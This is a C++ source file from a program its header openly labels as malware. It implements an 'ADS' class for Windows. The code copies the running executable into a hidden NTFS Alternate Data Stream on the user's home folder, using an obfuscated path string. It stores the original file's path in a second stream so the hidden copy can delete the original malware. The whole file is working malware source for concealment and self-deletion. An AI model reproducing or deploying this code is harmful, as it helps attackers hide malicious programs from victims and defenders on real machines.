/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#include "ADS.h"

ADS::ADS()
{
	this->currentUserDir = Tools::decode("Us:\\\\Crse") + Tools::Computer_Username; // decode -> C:\\Users\\				.
	BOOL adsFile = NULL;

	// Copy this file to stream file on C:/Users/USERNAME:streamfile
	if (!(adsFile = CreateADS(Tools::GetThisProgramPath(), this->currentUserDir, HIDE_NAME)))
	{
#ifndef LOG_OFF
		std::cout << "ADS!CreateADS Failed, Error code #" << GetLastError() << "\n\n";
#endif // LOG_OFF
	}

	// Create a file with this path so I can delete it later
	if (adsFile == TRUE)
	{
		HANDLE hFile = CreateFileA((this->currentUserDir + ":" + SELF_DELETE).c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hFile != INVALID_HANDLE_VALUE)
		{
			if (!Tools::WriteToFile(this->currentUserDir + ":" + SELF_DELETE, Tools::GetThisProgramPath(), hFile))
				DeleteFileA((this->currentUserDir + ":" + SELF_DELETE).c_str());
		}
	}
}

// Create a Alternative Data Stream file
BOOL ADS::CreateADS(const std::string& source_path, const std::string& destination_path, const std::string& stream_name)
{
	if (Tools::FileExists(destination_path) || Tools::dirExists(destination_path)) // check if the destination to put the stream file on is exists
		if (Tools::FileExists(source_path)) // Check if the file to copy is exists
			if (!Tools::FileExists(destination_path + ":" + stream_name)) // Check if the stream file already exists
				if (CopyFileA(source_path.c_str(), (destination_path + ":" + stream_name).c_str(), TRUE))
					return TRUE;
				else
					return ADS_ALREADY_EXISTS;

	return FALSE;
}

// Read From stream file the path to the original malware and then delete the original malware
BOOL ADS::DeleteTheOriginalMalware()
{
	if (Tools::FileExists(this->currentUserDir + ":" + SELF_DELETE))
	{
		std::string path = Tools::ReadFromFile(this->currentUserDir + ":" + SELF_DELETE);
		if (path != "")
		{
			if(DeleteFileA(path.c_str()) != NULL)
				DeleteFileA((this->currentUserDir + ":" + SELF_DELETE).c_str());
			return TRUE;
		}
	}
	return FALSE;
}